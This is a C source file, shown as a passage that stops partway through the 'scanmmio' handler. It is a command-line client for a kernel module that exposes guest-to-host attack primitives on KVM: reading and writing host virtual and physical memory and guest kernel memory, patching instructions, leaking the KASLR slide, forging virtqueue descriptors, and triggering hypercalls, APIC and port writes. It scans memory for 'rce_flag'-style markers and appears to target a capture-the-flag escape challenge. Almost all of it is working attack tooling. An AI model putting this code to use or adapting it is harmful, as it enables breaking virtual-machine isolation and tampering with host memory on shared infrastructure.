#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <inttypes.h>
#include <time.h>
#include <linux/virtio_ids.h>
#include <sys/mman.h>
#include <ctype.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"

#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_WRITE_VQ_DESC      0x1007
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_PATCH_INSTRUCTIONS 0x100B
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_ATTACH_VQ          0x1013
#define IOCTL_TRIGGER_VQ         0x1014
#define IOCTL_SCAN_PHYS          0x1015
// NEW: Host memory access IOCTLs
#define IOCTL_READ_HOST_MEM      0x1016
#define IOCTL_WRITE_HOST_MEM     0x1017
#define IOCTL_READ_HOST_PHYS     0x1018
#define IOCTL_WRITE_HOST_PHYS    0x1019

/* New guest-side IOCTLs added to kernel module */
#define IOCTL_PROBE_FLAGS_READ   0x1020
#define IOCTL_PROBE_FLAGS_WRITE  0x1021
#define IOCTL_TRIGGER_APIC_WRITE 0x1022
#define IOCTL_TRIGGER_MMIO_WRITE 0x1023
#define IOCTL_TRIGGER_IOPORT_WRITE 0x1024
#define IOCTL_READ_FLAG_FULL     0x1025

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct vq_desc_user_data {
    unsigned short index;
    unsigned long long phys_addr;
    unsigned int len;
    unsigned short flags;
    unsigned short next_idx;
};

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct va_scan_data {
    unsigned long va;
    unsigned long size;
    unsigned char *user_buffer;
};

struct va_write_data {
    unsigned long va;
    unsigned long size;
    unsigned char *user_buffer;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
};

struct attach_vq_data {
    unsigned int device_id;
    unsigned long vq_pfn;
    unsigned int queue_index;
};

// NEW: Host memory access structures
struct host_mem_access {
    unsigned long host_addr;     // Host virtual address
    unsigned long length;
    unsigned char *user_buffer;
};

// NEW: Host physical memory access
struct host_phys_access {
    unsigned long host_phys_addr; // Host physical address
    unsigned long length;
    unsigned char *user_buffer;
};

/* APIC write request for IOCTL_TRIGGER_APIC_WRITE */
struct apic_write_req {
    unsigned long base;   /* 0 to use default 0xfee00000 */
    unsigned int offset;  /* offset from APIC base (e.g. 0xb0 for EOI) */
    unsigned int size;    /* 1,2,4,8 */
    unsigned long value;
};

/* Print a u64 value as a full 64-hex-digit string (zero-padded on the left).
 * Kernel currently returns a 64-bit value for the probe read IOCTL; this helper
 * ensures userland prints it as a full 64-hex-digit flag (left-padded with zeros).
 */
static void print_full_64hex_from_u64(unsigned long v)
{
    char s[65];
    memset(s, '0', 64);
    s[64] = '\0';
    /* write the lower 16 hex digits (64-bit value) into the right-most part */
    snprintf(s + 48, 17, "%016llx", (unsigned long long)v);
    printf("0x%s", s);
}

/* Print 32 bytes as full 64 hex digits (no truncation) */
static void print_full_32byte_hex(const unsigned char *buf)
{
    for (int i = 0; i < 32; ++i)
        printf("%02x", buf[i]);
}

// Gold pattern constants
#define GOLD_FLAG_STRINGS_COUNT 7
static const char *GOLD_ASCII_STRINGS[GOLD_FLAG_STRINGS_COUNT] = {
    "44434241efbeadde",
    "44342414deadbeef",
    "deadbeef14243444",
    "deadbeef41424344",
    "write_flag",
    "rce_flag",
    "read_flag"
};

#define GOLD_HEX_STRINGS_COUNT 7
static const char *GOLD_HEX_STRINGS[GOLD_HEX_STRINGS_COUNT] = {
    "44434241efbeadde",
    "44342414deadbeef",
    "deadbeef14243444",
    "deadbeef41424344",
    "write_flag",
    "rce_flag",
    "read_flag"
};

void print_usage(char *prog_name) {
    fprintf(stderr, "  Usage: %s <command> [args...]\n", prog_name);
    fprintf(stderr, "  Commands:\n");
    fprintf(stderr, "  readport <port_hex> <size_bytes (1,2,4)>\n");
    fprintf(stderr, "  writeport <port_hex> <value_hex> <size_bytes (1,2,4)>\n");
    fprintf(stderr, "  readmmio_val <phys_addr_hex> <size_bytes (1,2,4,8)>\n");
    fprintf(stderr, "  writemmio_val <phys_addr_hex> <value_hex> <size_bytes (1,2,4,8)>\n");
    fprintf(stderr, "  readmmio_buf <phys_addr_hex> <num_bytes_to_read>\n");
    fprintf(stderr, "  writemmio_buf <phys_addr_hex> <hex_string_to_write>\n");
    fprintf(stderr, "  readkvmem <kaddr_hex> <num_bytes>\n");
    fprintf(stderr, "  writekvmem <kaddr_hex> <hex_string_to_write>\n");
    fprintf(stderr, "  readhostmem <host_vaddr_hex> <num_bytes>\n");
    fprintf(stderr, "  writehostmem <host_vaddr_hex> <hex_string_to_write>\n");
    fprintf(stderr, "  readhostphys <host_paddr_hex> <num_bytes>\n");
    fprintf(stderr, "  writehostphys <host_paddr_hex> <hex_string_to_write>\n");
    fprintf(stderr, "  allocvqpage\n");
    fprintf(stderr, "  freevqpage\n");
    fprintf(stderr, "  writevqdesc <idx> <buf_gpa_hex> <buf_len> <flags_hex> <next_idx>\n");
    fprintf(stderr, "  trigger_hypercall\n");
    fprintf(stderr, "  hypercall <nr> [arg0] [arg1] [arg2] [arg3]\n");
    fprintf(stderr, "  exploit_delay <nanoseconds>\n");
    fprintf(stderr, "  scanmmio <start_addr_hex> <end_addr_hex> <step_bytes>\n");
    fprintf(stderr, "  scanva <va_hex> <num_bytes>\n");
    fprintf(stderr, "  scanva_range <start> <end> <step>\n");
    fprintf(stderr, "  writeva <va_hex> <hex_string>\n");
    fprintf(stderr, "  patchinstr <va_hex> <hex_string>\n");
    fprintf(stderr, "  readflag\n");
    fprintf(stderr, "  readflag_full\n");
    fprintf(stderr, "  writeflag <value_hex>\n");
    fprintf(stderr, "  probe_flags_read\n");
    fprintf(stderr, "  probe_flags_write <value_hex>\n");
    fprintf(stderr, "  trigger_apic_write <offset_hex> <size_bytes> <value_hex> [apic_base_hex]\n");
    fprintf(stderr, "  trigger_mmio_write <phys_addr_hex> <map_size> <value_size> <value_hex>\n");
    fprintf(stderr, "  trigger_ioport_write <port_hex> <size_bytes> <value_hex>\n");
    fprintf(stderr, "  getkaslr\n");
    fprintf(stderr, "  virt2phys <virt_addr_hex>\n");
    fprintf(stderr, "  attachvq <device_id> <vq_pfn> <queue_index>\n");
    fprintf(stderr, "  trigvq <device_id>\n");
    fprintf(stderr, "  scanphys <start_addr_hex> <end_addr_hex> <step_bytes>\n");
    fprintf(stderr, "  scanhostmem <start_host_vaddr_hex> <end_host_vaddr_hex> <step_bytes> [--gold]\n");
    fprintf(stderr, "  scanhostphys <start_host_paddr_hex> <end_host_paddr_hex> <step_bytes> [--gold]\n");
    fprintf(stderr, "  --gold flag: Can be placed anywhere on the command line. When present\n");
    fprintf(stderr, "               only output commands that contain gold patterns (reduces noise).\n");
}

unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes) {
    size_t len = strlen(hex_str);
    if (len % 2 != 0) {
        fprintf(stderr, "Hex string must have even number of characters.\n");
        return NULL;
    }
    *num_bytes = len / 2;
    unsigned char *bytes = (unsigned char *)malloc(*num_bytes);
    if (!bytes) {
        perror("malloc for hex_string_to_bytes");
        return NULL;
    }
    for (size_t i = 0; i < *num_bytes; ++i) {
        if (sscanf(hex_str + 2 * i, "%2hhx", &bytes[i]) != 1) {
            fprintf(stderr, "Invalid hex char in string.\n");
            free(bytes);
            return NULL;
        }
    }
    return bytes;
}

void exploit_delay(int nanoseconds) {
    struct timespec req = {0};
    req.tv_nsec = nanoseconds;
    nanosleep(&req, NULL);
}

// Helper function to check for gold patterns
int check_gold_patterns(const unsigned char *data, unsigned long length, unsigned long base_addr) {
    int found = 0;
    
    // Check ASCII patterns
    for (int i = 0; i < GOLD_FLAG_STRINGS_COUNT; i++) {
        const char *pattern = GOLD_ASCII_STRINGS[i];
        size_t pattern_len = strlen(pattern);
        
        for (unsigned long j = 0; j <= length - pattern_len; j++) {
            if (memcmp(data + j, pattern, pattern_len) == 0) {
                printf("[GOLD] Found ASCII pattern '%s' at offset 0x%lx (addr 0x%lx)\n", 
                       pattern, j, base_addr + j);
                found = 1;
                
                // Print hex and ASCII context
                printf("Hex context: ");
                unsigned long start = (j >= 16) ? j - 16 : 0;
                unsigned long end = (j + pattern_len + 16 < length) ? j + pattern_len + 16 : length;
                for (unsigned long k = start; k < end; k++) {
                    printf("%02X", data[k]);
                }
                printf("\nASCII context: ");
                for (unsigned long k = start; k < end; k++) {
                    unsigned char c = data[k];
                    printf("%c", (c >= 32 && c <= 126) ? c : '.');
                }
                printf("\n\n");
            }
        }
    }
    
    // Check hex patterns (convert hex string to bytes and search)
    for (int i = 0; i < GOLD_HEX_STRINGS_COUNT; i++) {
        const char *hex_pattern = GOLD_HEX_STRINGS[i];
        size_t hex_len = strlen(hex_pattern);
        if (hex_len % 2 != 0) continue;
        
        size_t byte_len = hex_len / 2;
        unsigned char *pattern_bytes = malloc(byte_len);
        if (!pattern_bytes) continue;
        
        // Convert hex string to bytes
        for (size_t p = 0; p < byte_len; p++) {
            sscanf(hex_pattern + 2*p, "%2hhx", &pattern_bytes[p]);
        }
        
        // Search for the byte pattern
        for (unsigned long j = 0; j <= length - byte_len; j++) {
            if (memcmp(data + j, pattern_bytes, byte_len) == 0) {
                printf("[GOLD] Found HEX pattern '%s' at offset 0x%lx (addr 0x%lx)\n", 
                       hex_pattern, j, base_addr + j);
                found = 1;
                
                // Print hex and ASCII context
                printf("Hex context: ");
                unsigned long start = (j >= 16) ? j - 16 : 0;
                unsigned long end = (j + byte_len + 16 < length) ? j + byte_len + 16 : length;
                for (unsigned long k = start; k < end; k++) {
                    printf("%02X", data[k]);
                }
                printf("\nASCII context: ");
                for (unsigned long k = start; k < end; k++) {
                    unsigned char c = data[k];
                    printf("%c", (c >= 32 && c <= 126) ? c : '.');
                }
                printf("\n\n");
            }
        }
        
        free(pattern_bytes);
    }
    
    return found;
}

/* Global: enable "gold" filtering for any command when present anywhere on argv */
static int g_global_gold = 0;

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    /* Scan argv for a global --gold flag and remove it so command parsing is unchanged */
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "--gold") == 0) {
            g_global_gold = 1;
            /* remove argv[i] by shifting left */
            for (int j = i; j < argc - 1; ++j)
                argv[j] = argv[j+1];
            argc--;
            i--; /* re-check the new argv[i] */
        }
    }
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("Failed to open " DEVICE_PATH ". Is the kernel module loaded?");
        return 1;
    }
    char *cmd = argv[1];

    if (strcmp(cmd, "readport") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct port_io_data data;
        data.port = (unsigned short)strtoul(argv[2], NULL, 16);
        data.size = (unsigned int)strtoul(argv[3], NULL, 10);
        if (ioctl(fd, IOCTL_READ_PORT, &data) < 0)
            perror("ioctl READ_PORT failed");
        else
            printf("Port 0x%X (size %u) Value: 0x%X (%u)\n", data.port, data.size, data.value, data.value);

    } else if (strcmp(cmd, "writeport") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct port_io_data data;
        data.port = (unsigned short)strtoul(argv[2], NULL, 16);
        data.value = (unsigned int)strtoul(argv[3], NULL, 16);
        data.size = (unsigned int)strtoul(argv[4], NULL, 10);
        if (ioctl(fd, IOCTL_WRITE_PORT, &data) < 0)
            perror("ioctl WRITE_PORT failed");
        else
            printf("Wrote 0x%X to port 0x%X (size %u)\n", data.value, data.port, data.size);

    } else if (strcmp(cmd, "readmmio_val") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        data.value_size = (unsigned int)strtoul(argv[3], NULL, 10);
        data.size = 0;
        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0)
            perror("ioctl READ_MMIO (value) failed");
        else
            printf("MMIO 0x%lX (size %u) Value: 0x%lX (%lu)\n", data.phys_addr, data.value_size, data.single_value, data.single_value);

    } else if (strcmp(cmd, "writemmio_val") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        data.single_value = strtoul(argv[3], NULL, 16);
        data.value_size = (unsigned int)strtoul(argv[4], NULL, 10);
        data.size = 0;
        if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0)
            perror("ioctl WRITE_MMIO (value) failed");
        else
            printf("Wrote 0x%lX to MMIO 0x%lX (size %u)\n", data.single_value, data.phys_addr, data.value_size);

    } else if (strcmp(cmd, "readmmio_buf") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        data.size = strtoul(argv[3], NULL, 10);
        if (data.size == 0 || data.size > 65536) {
            fprintf(stderr, "Invalid read size for buffer (max 64K).\n");
            close(fd);
            return 1;
        }
        data.user_buffer = (unsigned char*)malloc(data.size);
        if (!data.user_buffer) {
            perror("malloc for read buffer");
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0)
            perror("ioctl READ_MMIO (buffer) failed");
        else {
            if (g_global_gold) {
                int found = check_gold_patterns(data.user_buffer, data.size, data.phys_addr);
                if (!found) {
                    /* suppressed output when nothing gold was found */
                }
            } else {
                printf("Read %lu bytes from MMIO 0x%lX:\n", data.size, data.phys_addr);
                for (unsigned long i = 0; i < data.size; ++i) {
                    printf("%02X", data.user_buffer[i]);
                    if ((i+1) % 16 == 0) printf(" ");
                }
                printf("\n\n[ASCII]:\n");
                for (unsigned long i = 0; i < data.size; ++i) {
                    unsigned char c = data.user_buffer[i];
                    printf("%c", (c >= 32 && c <= 126) ? c : '.');
                    if ((i+1) % 16 == 0) printf(" ");
                }
                printf("\n");
            }
         }
         free(data.user_buffer);

    } else if (strcmp(cmd, "writemmio_buf") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        unsigned long num_bytes = 0;
        unsigned char *bytes_to_write = hex_string_to_bytes(argv[3], &num_bytes);
        if (!bytes_to_write || num_bytes == 0) {
            fprintf(stderr, "Failed to parse hex string or zero length.\n");
            if (bytes_to_write) free(bytes_to_write);
            close(fd);
            return 1;
        }
        data.user_buffer = bytes_to_write;
        data.size = num_bytes;
        if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0)
            perror("ioctl WRITE_MMIO (buffer) failed");
        else
            printf("Wrote %lu bytes to MMIO 0x%lX from hex string.\n", data.size, data.phys_addr);
        free(bytes_to_write);

    } else if (strcmp(cmd, "readkvmem") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct kvm_kernel_mem_read req;
        req.kernel_addr = strtoul(argv[2], NULL, 16);
        req.length = strtoul(argv[3], NULL, 10);
        if (req.length == 0 || req.length > 99999999) {
            fprintf(stderr, "Invalid read length (1-99999999 supported)\n");
            close(fd); return 1;
        }
        req.user_buf = malloc(req.length);
        if (!req.user_buf) {
            perror("malloc for kernel mem read");
            close(fd); return 1;
        }
        if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
            perror("ioctl IOCTL_READ_KERNEL_MEM failed");
        } else {
            if (g_global_gold) {
                int found = check_gold_patterns(req.user_buf, req.length, req.kernel_addr);
                if (!found) {
                    /* suppressed output when nothing gold was found */
                }
            } else {
                printf("Kernel memory @ 0x%lx:\n", req.kernel_addr);
                for (unsigned long i = 0; i < req.length; ++i) {
                    printf("%02X", req.user_buf[i]);
                    if ((i + 1) % 16 == 0) printf(" ");
                    if ((i + 1) % 64 == 0) printf("\n");
                }
                printf("\n[ASCII]:\n");
                for (unsigned long i = 0; i < req.length; ++i)
                    printf("%c", (req.user_buf[i] >= 0x20 && req.user_buf[i] < 0x7F) ? req.user_buf[i] : '.');
                printf("\n");
            }
         }
         free(req.user_buf);

    } else if (strcmp(cmd, "writekvmem") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct kvm_kernel_mem_write req;
        req.kernel_addr = strtoul(argv[2], NULL, 16);
        unsigned long num_bytes = 0;
        req.user_buf = hex_string_to_bytes(argv[3], &num_bytes);
        req.length = num_bytes;
        if (!req.user_buf || req.length == 0) {
            fprintf(stderr, "Failed to parse hex string.\n");
            if (req.user_buf) free(req.user_buf);
            close(fd); return 1;
        }
        if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0)
            perror("ioctl IOCTL_WRITE_KERNEL_MEM failed");
        else
            printf("Wrote %lu bytes to kernel memory 0x%lX.\n", req.length, req.kernel_addr);
        free(req.user_buf);

    } else if (strcmp(cmd, "readhostmem") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct host_mem_access req;
        req.host_addr = strtoul(argv[2], NULL, 16);
        req.length = strtoul(argv[3], NULL, 10);
        if (req.length == 0 || req.length > 99999999) {
            fprintf(stderr, "Invalid read length (1-99999999 supported)\n");
            close(fd); return 1;
        }
        req.user_buffer = malloc(req.length);
        if (!req.user_buffer) {
            perror("malloc for host mem read");
            close(fd); return 1;
        }
        if (ioctl(fd, IOCTL_READ_HOST_MEM, &req) < 0) {
            perror("ioctl IOCTL_READ_HOST_MEM failed");
        } else {
            if (g_global_gold) {
                int found = check_gold_patterns(req.user_buffer, req.length, req.host_addr);
                if (!found) {
                    /* suppressed output when nothing gold was found */
                }
            } else {
                printf("Host memory @ 0x%lx:\n", req.host_addr);
                for (unsigned long i = 0; i < req.length; ++i) {
                    printf("%02X", req.user_buffer[i]);
                    if ((i + 1) % 16 == 0) printf(" ");
                    if ((i + 1) % 64 == 0) printf("\n");
                }
                printf("\n[ASCII]:\n");
                for (unsigned long i = 0; i < req.length; ++i)
                    printf("%c", (req.user_buffer[i] >= 0x20 && req.user_buffer[i] < 0x7F) ? req.user_buffer[i] : '.');
                printf("\n");
            }
         }
         free(req.user_buffer);

    } else if (strcmp(cmd, "writehostmem") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct host_mem_access req;
        req.host_addr = strtoul(argv[2], NULL, 16);
        unsigned long num_bytes = 0;
        req.user_buffer = hex_string_to_bytes(argv[3], &num_bytes);
        req.length = num_bytes;
        if (!req.user_buffer || req.length == 0) {
            fprintf(stderr, "Failed to parse hex string.\n");
            if (req.user_buffer) free(req.user_buffer);
            close(fd); return 1;
        }
        if (ioctl(fd, IOCTL_WRITE_HOST_MEM, &req) < 0)
            perror("ioctl IOCTL_WRITE_HOST_MEM failed");
        else
            printf("Wrote %lu bytes to host memory 0x%lx.\n", req.length, req.host_addr);
        free(req.user_buffer);

    } else if (strcmp(cmd, "readhostphys") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct host_phys_access req;
        req.host_phys_addr = strtoul(argv[2], NULL, 16);
        req.length = strtoul(argv[3], NULL, 10);
        if (req.length == 0 || req.length > 99999999) {
            fprintf(stderr, "Invalid read length (1-99999999 supported)\n");
            close(fd); return 1;
        }
        req.user_buffer = malloc(req.length);
        if (!req.user_buffer) {
            perror("malloc for host phys read");
            close(fd); return 1;
        }
        if (ioctl(fd, IOCTL_READ_HOST_PHYS, &req) < 0) {
            perror("ioctl IOCTL_READ_HOST_PHYS failed");
        } else {
            if (g_global_gold) {
                int found = check_gold_patterns(req.user_buffer, req.length, req.host_phys_addr);
                if (!found) {
                    /* suppressed output when nothing gold was found */
                }
            } else {
                printf("Host physical memory @ 0x%lx:\n", req.host_phys_addr);
                for (unsigned long i = 0; i < req.length; ++i) {
                    printf("%02X", req.user_buffer[i]);
                    if ((i + 1) % 16 == 0) printf(" ");
                    if ((i + 1) % 64 == 0) printf("\n");
                }
                printf("\n[ASCII]:\n");
                for (unsigned long i = 0; i < req.length; ++i)
                    printf("%c", (req.user_buffer[i] >= 0x20 && req.user_buffer[i] < 0x7F) ? req.user_buffer[i] : '.');
                printf("\n");
            }
         }
         free(req.user_buffer);

    } else if (strcmp(cmd, "writehostphys") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct host_phys_access req;
        req.host_phys_addr = strtoul(argv[2], NULL, 16);
        unsigned long num_bytes = 0;
        req.user_buffer = hex_string_to_bytes(argv[3], &num_bytes);
        req.length = num_bytes;
        if (!req.user_buffer || req.length == 0) {
            fprintf(stderr, "Failed to parse hex string.\n");
            if (req.user_buffer) free(req.user_buffer);
            close(fd); return 1;
        }
        if (ioctl(fd, IOCTL_WRITE_HOST_PHYS, &req) < 0)
            perror("ioctl IOCTL_WRITE_HOST_PHYS failed");
        else
            printf("Wrote %lu bytes to host physical memory 0x%lx.\n", req.length, req.host_phys_addr);
        free(req.user_buffer);

        /* --- NEW CLI handlers for IOCTLs 0x1020..0x1024 --- */
    } else if (strcmp(cmd, "probe_flags_read") == 0) {
        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long val = 0;
        if (ioctl(fd, IOCTL_PROBE_FLAGS_READ, &val) < 0) {
            perror("ioctl PROBE_FLAGS_READ failed");
        } else {
            printf("Probe flags read: ");
            print_full_64hex_from_u64(val);
            printf("\n");
        }

    } else if (strcmp(cmd, "probe_flags_write") == 0) {
        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long val = strtoul(argv[2], NULL, 16);
        if (ioctl(fd, IOCTL_PROBE_FLAGS_WRITE, &val) < 0) {
            perror("ioctl PROBE_FLAGS_WRITE failed");
        } else {
            printf("Wrote ");
            print_full_64hex_from_u64(val);
            printf(" to first host flag symbol (probe)\n");
        }

    } else if (strcmp(cmd, "trigger_apic_write") == 0) {
        if (argc < 5) { print_usage(argv[0]); close(fd); return 1; }
        struct apic_write_req req;
        req.base = 0;
        req.offset = (unsigned int)strtoul(argv[2], NULL, 16);
        req.size = (unsigned int)strtoul(argv[3], NULL, 10);
        req.value = strtoul(argv[4], NULL, 16);
        if (argc >= 6) req.base = strtoul(argv[5], NULL, 16);
        if (req.size != 1 && req.size != 2 && req.size != 4 && req.size != 8) {
            fprintf(stderr, "Invalid size for APIC write\n"); close(fd); return 1;
        }
        if (ioctl(fd, IOCTL_TRIGGER_APIC_WRITE, &req) < 0) {
            perror("ioctl TRIGGER_APIC_WRITE failed");
        } else {
            printf("APIC write issued base=0x%lx off=0x%x size=%u val=0x%lx\n",
                   req.base, req.offset, req.size, req.value);
        }

    } else if (strcmp(cmd, "trigger_mmio_write") == 0) {
        if (argc != 6) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data mreq = {0};
        mreq.phys_addr = strtoul(argv[2], NULL, 16);
        mreq.size = strtoul(argv[3], NULL, 10); /* 0 for single-value */
        mreq.value_size = (unsigned int)strtoul(argv[4], NULL, 10);
        mreq.single_value = strtoul(argv[5], NULL, 16);
        if (mreq.value_size != 1 && mreq.value_size != 2 && mreq.value_size != 4 && mreq.value_size != 8) {
            fprintf(stderr, "Invalid value-size\n"); close(fd); return 1;
        }
        if (ioctl(fd, IOCTL_TRIGGER_MMIO_WRITE, &mreq) < 0) {
            perror("ioctl TRIGGER_MMIO_WRITE failed");
        } else {
            printf("MMIO write issued phys=0x%lx map_size=%lu value_size=%u val=0x%lx\n",
                   mreq.phys_addr, mreq.size, mreq.value_size, mreq.single_value);
        }

    } else if (strcmp(cmd, "trigger_ioport_write") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct port_io_data p = {0};
        p.port = (unsigned short)strtoul(argv[2], NULL, 16);
        p.size = (unsigned int)strtoul(argv[3], NULL, 10);
        p.value = (unsigned int)strtoul(argv[4], NULL, 16);
        if (p.size != 1 && p.size != 2 && p.size != 4) {
            fprintf(stderr, "Invalid port write size\n");
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_TRIGGER_IOPORT_WRITE, &p) < 0) {
            perror("ioctl TRIGGER_IOPORT_WRITE failed");
        } else {
            printf("IO port write issued port=0x%X size=%u val=0x%X\n", p.port, p.size, p.value);
        }

    } else if (strcmp(cmd, "allocvqpage") == 0) {
        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long pfn_returned = 0;
        if (ioctl(fd, IOCTL_ALLOC_VQ_PAGE, &pfn_returned) < 0) {
            perror("ioctl ALLOC_VQ_PAGE failed");
        } else {
            printf("Allocated VQ page. PFN: 0x%lX\n", pfn_returned);
            printf("Guest Physical Address (approx, if PAGE_SIZE=4096): 0x%lX\n", pfn_returned * 0x1000);
        }

    } else if (strcmp(cmd, "freevqpage") == 0) {
        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
        if (ioctl(fd, IOCTL_FREE_VQ_PAGE) < 0) {
            perror("ioctl FREE_VQ_PAGE failed");
        } else {
            printf("Sent FREE_VQ_PAGE command.\n");
        }

    } else if (strcmp(cmd, "writevqdesc") == 0) {
        if (argc != 7) { print_usage(argv[0]); close(fd); return 1; }
        struct vq_desc_user_data d_data;
        d_data.index = (unsigned short)strtoul(argv[2], NULL, 10);
        d_data.phys_addr = strtoull(argv[3], NULL, 16);
        d_data.len = (unsigned int)strtoul(argv[4], NULL, 0);
        d_data.flags = (unsigned short)strtoul(argv[5], NULL, 16);
        d_data.next_idx = (unsigned short)strtoul(argv[6], NULL, 10);

        fprintf(stderr, "[Prober: Sending WRITE_VQ_DESC for index %hu: GPA=0x%llx, len=%u, flags=0x%hx, next=%hu]\n",
                d_data.index, d_data.phys_addr, d_data.len, d_data.flags, d_data.next_idx);

        if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &d_data) < 0) {
            perror("ioctl IOCTL_WRITE_VQ_DESC failed");
        } else {
            printf("Sent IOCTL_WRITE_VQ_DESC command.\n");
        }

    } else if (strcmp(cmd, "trigger_hypercall") == 0) {
        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
        long hypercall_ret = 0;
        if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &hypercall_ret) < 0) {
            perror("ioctl IOCTL_TRIGGER_HYPERCALL failed");
        } else {
            printf("Hypercall triggered, return value: %ld\n", hypercall_ret);
        }

    } else if (strcmp(cmd, "exploit_delay") == 0) {
        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
        int delay_ns = atoi(argv[2]);
        exploit_delay(delay_ns);
        printf("Delayed for %d nanoseconds.\n", delay_ns);

    } else if (strcmp(cmd, "scanva") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct va_scan_data req = {0};
        req.va = strtoul(argv[2], NULL, 16);
        req.size = strtoul(argv[3], NULL, 10);
        if (req.size == 0) {
            fprintf(stderr, "Invalid size for scanva (must be >0).\n");
            close(fd);
            return 1;
        }
        req.user_buffer = malloc(req.size);
        if (!req.user_buffer) {
            perror("malloc for scanva buffer");
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_SCAN_VA, &req) < 0) {
            perror("ioctl IOCTL_SCAN_VA failed");
        } else {
            printf("Kernel VA @ 0x%lX:\n", req.va);
            for (unsigned long i = 0; i < req.size; ++i) {
                printf("%02X", req.user_buffer[i]);
                if ((i+1) % 16 == 0) printf(" ");
            }
            printf("\n[ASCII]:\n");
            for (unsigned long i = 0; i < req.size; ++i) {
                unsigned char c = req.user_buffer[i];
                printf("%c", (c >= 32 && c <= 126) ? c : '.');
                if ((i+1) % 16 == 0) printf(" ");
            }
            printf("\n");
        }
        free(req.user_buffer);

    } else if (strcmp(cmd, "scanva_range") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long start = strtoul(argv[2], NULL, 16);
        unsigned long end = strtoul(argv[3], NULL, 16);
        unsigned long step = strtoul(argv[4], NULL, 10);
        if (step == 0 || step > 99999999) {
            fprintf(stderr, "Invalid step size (1-99999999 bytes)\n");
            close(fd);
            return 1;
        }
        unsigned char *buf = malloc(step);
        if (!buf) {
            perror("malloc for scanva_range buffer");
            close(fd);
            return 1;
        }
        for (unsigned long addr = start; addr < end; addr += step) {
            struct va_scan_data req = {0};
            req.va = addr;
            req.size = step;
            req.user_buffer = buf;
            if (ioctl(fd, IOCTL_SCAN_VA, &req) < 0) {
                printf("0x%lX: ERROR\n", addr);
            } else {
                printf("0x%lX:", addr);
                for (unsigned long i = 0; i < step; ++i) {
                    printf("%02X", buf[i]);
                }
                printf("\n");
            }
        }
        free(buf);

    } else if (strcmp(cmd, "scanmmio") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long start = strtoul(argv[2], NULL, 16);
        unsigned long end = strtoul(argv[3], NULL, 16);
